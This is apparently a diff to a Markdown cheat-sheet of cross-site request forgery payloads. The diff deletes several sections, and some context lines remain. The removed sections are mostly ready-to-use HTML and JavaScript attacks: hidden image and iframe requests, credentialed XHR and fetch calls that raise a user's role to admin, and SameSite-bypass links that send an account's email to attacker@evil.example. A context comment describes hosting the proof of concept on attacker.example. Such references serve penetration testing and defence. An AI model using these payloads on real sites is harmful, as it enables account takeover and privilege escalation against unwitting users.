@@ -12,16 +12,6 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 ## Auto-Submit Forms
 
-### GET-Based CSRF
-
-```html
-<!-- Image tag triggers GET request -->
-<img src="http://target.example/api/changeEmail?email=attacker@evil.example">
-
-<!-- Hidden iframe -->
-<iframe src="http://target.example/api/deleteAccount?confirm=true" style="display:none"></iframe>
-```
-
 ### POST-Based CSRF (Auto-Submit)
 
 ```html
@@ -43,18 +33,6 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 ## JSON CSRF
 
-### XHR-Based
-
-```html
-<script>
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "http://target.example/api/changeRole", true);
-xhr.setRequestHeader("Content-Type", "text/plain");
-xhr.withCredentials = true;
-xhr.send('{"role":"admin"}');
-</script>
-```
-
 ### Form-Based JSON (Content-Type Trick)
 
 ```html
@@ -65,21 +43,6 @@ xhr.send('{"role":"admin"}');
 ```
 
 This sends: `{"role":"admin","extra":"="}` which is valid JSON.
-
-### Fetch API
-
-```html
-<script>
-fetch('http://target.example/api/changeRole', {
-  method: 'POST',
-  credentials: 'include',
-  headers: {'Content-Type': 'application/json'},
-  body: '{"role":"admin"}'
-});
-</script>
-```
-
-Note: This triggers a pre-flight if Content-Type is `application/json`. Works only if CORS allows it.
 
 ## File Upload CSRF
 
@@ -151,16 +114,6 @@ If the app checks that a cookie value matches a form parameter:
 
 <!-- Include target domain in Referer path -->
 <!-- Host PoC at: https://attacker.example/target.example/csrf.html -->
-```
-
-## SameSite Cookie Bypass
-
-```html
-<!-- SameSite=Lax allows GET requests from top-level navigation -->
-<a href="http://target.example/api/action?email=attacker@evil.example">Click here</a>
-
-<!-- Force top-level navigation with window.open -->
-<script>window.open('http://target.example/api/action?email=attacker@evil.example')</script>
 ```
 
 ## Useful Curl for Testing
